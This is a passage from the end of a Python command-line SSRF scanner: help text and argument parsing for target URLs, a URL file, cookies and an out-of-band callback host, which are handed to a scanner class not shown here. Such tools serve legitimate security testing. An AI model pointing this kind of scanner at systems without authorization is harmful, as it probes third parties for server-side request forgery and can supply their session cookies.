    print("  -h, --help     : Show this help message")
    print("  -u, --url      : Single URL to scan")
    print("  -f, --file     : File containing URLs to scan")
    print("  -b, --backurl  : Callback URL for remote SSRF detection")
    print("  -d, --debug    : Enable debug mode")
    print("  -c, --cookie   : Manually set cookies (format: 'name1=value1; name2=value2')")
    print("\nExample:")
    print("  python3 ssrf_scanner.py -u https://example.com -b callback.yourserver.com")
    print("  python3 ssrf_scanner.py -f urls.txt -b callback.yourserver.com")
    print("  python3 ssrf_scanner.py -u https://example.com -c 'session=abc123'")

def main():
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hu:f:b:dc:",
                                 ["help", "url=", "file=", "backurl=", "debug", "cookie="])
    except getopt.GetoptError as err:
        print(str(err))
        sys.exit(2)

    url = None
    url_file = None
    backurl = None
    debug = False
    cookies = None

    for opt, arg in opts:
        if opt in ("-h", "--help"):
            print_help()
            sys.exit()
        elif opt in ("-u", "--url"):
            url = arg
        elif opt in ("-f", "--file"):
            url_file = arg
        elif opt in ("-b", "--backurl"):
            backurl = arg
        elif opt in ("-d", "--debug"):
            debug = True
        elif opt in ("-c", "--cookie"):
            cookies = arg

    if not (url or url_file):
        print("Error: Must provide either URL or file")
        sys.exit(1)

    scanner = SSRFScanner()
    scanner.config.scanner['debug'] = debug
    if backurl:
        scanner.backurl = backurl
    if cookies:
        scanner.cookies = cookies

    scanner.run(urls=[url] if url else None, url_file=url_file)

if __name__ == "__main__":
    main()
